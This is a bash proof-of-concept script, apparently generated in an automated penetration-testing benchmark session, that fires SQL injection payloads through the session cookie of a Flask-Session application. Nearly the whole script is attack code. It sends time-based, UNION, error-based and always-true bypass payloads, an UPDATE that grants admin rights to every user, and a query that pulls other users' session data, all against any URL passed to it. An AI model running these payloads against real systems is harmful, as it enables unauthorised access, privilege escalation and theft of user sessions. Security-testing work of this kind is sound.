#!/bin/bash
# POC: Demonstrates SQL injection vulnerability in Flask-Session session ID lookup via crafted session cookie with SQL injection payload
# Target: ./repo
# Created: 2025-11-07T17:27:28.235Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

# Flask-Session SQLi POC - Session ID Lookup Injection
# This POC attempts to trigger SQL injection in Flask-Session session ID lookup
# by crafting malicious session cookies with SQL injection payloads

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/"

echo "[*] Flask-Session SQL Injection - Session ID Lookup POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Basic session lookup with normal session ID
echo "[+] Test 1: Normal session request"
curl -s -i "$TARGET_URL$ENDPOINT" 2>&1 | head -20
echo ""

# Test 2: Attempt time-based blind SQL injection in session ID
# This would sleep if vulnerable: ' OR SLEEP(5) --
echo "[+] Test 2: Time-based SQL injection payload in session cookie"
PAYLOAD="'; SELECT SLEEP(5); --"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "[*] Payload: $PAYLOAD"
echo "[*] Encoded: $ENCODED_PAYLOAD"
START_TIME=$(date +%s%N)
curl -s -i -b "session=$ENCODED_PAYLOAD" "$TARGET_URL$ENDPOINT" 2>&1 | head -20
END_TIME=$(date +%s%N)
ELAPSED=$(( (END_TIME - START_TIME) / 1000000 ))
echo "[*] Response time: ${ELAPSED}ms"
echo ""

# Test 3: UNION-based SQL injection to extract database information
echo "[+] Test 3: UNION-based SQL injection payload"
UNION_PAYLOAD="' UNION SELECT 1,2,3,4,5 FROM information_schema.tables --"
ENCODED_UNION=$(printf %s "$UNION_PAYLOAD" | jq -sRr @uri)
echo "[*] Payload: $UNION_PAYLOAD"
curl -s -i -b "session=$ENCODED_UNION" "$TARGET_URL$ENDPOINT" 2>&1 | head -30
echo ""

# Test 4: Error-based SQL injection
echo "[+] Test 4: Error-based SQL injection payload"
ERROR_PAYLOAD="' AND extractvalue(1,concat(0x7e,(SELECT database()))) --"
ENCODED_ERROR=$(printf %s "$ERROR_PAYLOAD" | jq -sRr @uri)
echo "[*] Payload: $ERROR_PAYLOAD"
curl -s -i -b "session=$ENCODED_ERROR" "$TARGET_URL$ENDPOINT" 2>&1 | head -30
echo ""

# Test 5: Authentication bypass via SQL injection
echo "[+] Test 5: Authentication bypass via always-true condition"
BYPASS_PAYLOAD="' OR '1'='1' --"
ENCODED_BYPASS=$(printf %s "$BYPASS_PAYLOAD" | jq -sRr @uri)
echo "[*] Payload: $BYPASS_PAYLOAD"
curl -s -i -b "session=$ENCODED_BYPASS" "$TARGET_URL$ENDPOINT" 2>&1 | head -30
echo ""

# Test 6: Attempt to modify session data via UPDATE injection
echo "[+] Test 6: UPDATE injection to escalate privileges"
UPDATE_PAYLOAD="'; UPDATE user SET is_admin=1; --"
ENCODED_UPDATE=$(printf %s "$UPDATE_PAYLOAD" | jq -sRr @uri)
echo "[*] Payload: $UPDATE_PAYLOAD"
curl -s -i -b "session=$ENCODED_UPDATE" "$TARGET_URL$ENDPOINT" 2>&1 | head -30
echo ""

# Test 7: Extract session data from other users via UNION
echo "[+] Test 7: Extract all session data via UNION injection"
EXTRACT_PAYLOAD="' UNION SELECT sid,data,created_at,accessed_at FROM mysessions --"
ENCODED_EXTRACT=$(printf %s "$EXTRACT_PAYLOAD" | jq -sRr @uri)
echo "[*] Payload: $EXTRACT_PAYLOAD"
curl -s -i -b "session=$ENCODED_EXTRACT" "$TARGET_URL$ENDPOINT" 2>&1 | head -40
echo ""

echo "[*] POC Complete - Check for:"
echo "    - Unusual response times (indicates time-based SQLi)"
echo "    - SQL error messages in responses (indicates error-based SQLi)"
echo "    - Modified session behavior (indicates successful injection)"
echo "    - Database information leakage (indicates UNION-based SQLi)"
echo "    - Changes to user records (indicates UPDATE injection)"